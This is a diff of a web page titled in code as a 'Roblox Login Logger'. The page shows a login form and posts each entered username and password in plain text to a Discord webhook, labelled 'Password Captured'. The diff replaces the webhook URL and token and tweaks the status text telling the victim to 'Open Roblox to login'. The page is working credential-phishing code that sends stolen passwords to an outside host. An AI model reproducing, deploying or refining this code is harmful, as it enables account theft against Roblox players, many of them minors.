@@ -21,8 +21,7 @@ button { padding:10px 20px; margin:10px; border-radius:5px; border:none; backgro
 <p id="status">Enter credentials and click a button</p>
 
 <script>
-// Discord webhook URL
-const webhookURL = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
+const webhookURL = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
 
 const usernameInput = document.getElementById("username");
 const passwordInput = document.getElementById("password");
@@ -34,10 +33,10 @@ function sendWebhook(username, password) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             username: "Roblox Login Logger",
-            content: `🔐 **Password Captured**\n👤 User: ${username}\n🔑 Password: ${password}\n🌍 Status: ❌ Pending manual login`
+            content: `🔐 **Password Captured**\n👤 User: ${username}\n🔑 Password: ${password}\n🌍 Status: Pending manual login`
         })
     })
-    .then(() => statusEl.textContent = "✅ Credentials sent to webhook!")
+    .then(() => statusEl.textContent = "✅ Credentials sent to webhook! Open Roblox to login.")
     .catch(() => statusEl.textContent = "❌ Failed to send to webhook!");
 }
 
